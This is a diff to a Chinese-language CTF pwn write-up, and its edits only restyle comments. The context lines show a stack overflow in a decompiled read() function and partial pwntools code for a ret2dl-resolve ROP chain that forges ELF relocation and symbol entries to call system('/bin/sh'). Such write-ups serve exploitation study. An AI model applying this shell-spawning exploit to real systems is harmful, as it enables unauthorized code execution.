@@ -37,7 +37,7 @@ sub_804843B()函数
 
 	ssize_t sub_804843B()
 	{
-	  char buf; // [esp+0h] [ebp-28h]
+	  char buf;  #[esp+0h] [ebp-28h]
 	  return read(0, &buf, 0x40u);
 	}
 
@@ -61,7 +61,7 @@ sub_804843B()函数
 	.text:08048454                 nop
 	.text:08048455                 leave
 	.text:08048456                 retn
-	.text:08048456 ; } // starts at 804843B
+	.text:08048456 ; }  #starts at 804843B
 	.text:08048456 sub_804843B     endp
 
 发现只开了一个栈不可执行，于是想构造rop链。但是整个文件搜索下来也没有发现什么有价值的gadget。pwn题一般都会提供一个libc文件用于泄露函数的地址，在这里使用一个不依赖于libc的溢出方法。
@@ -95,7 +95,7 @@ sub_804843B()函数
 	 
 	buf2 =  rop.string('/bin/sh')
 	buf2 += rop.fill(20, buf2)
-	buf2 += rop.dl_resolve_data(addr_bss+20,'system')#在bss段伪造Elf32_Rel 和 Elf32_Sym
+	buf2 += rop.dl_resolve_data(addr_bss+20,'system') #在bss段伪造Elf32_Rel 和 Elf32_Sym
 	buf2 += rop.fill(100, buf2)
 	p.send(buf2)
 	 
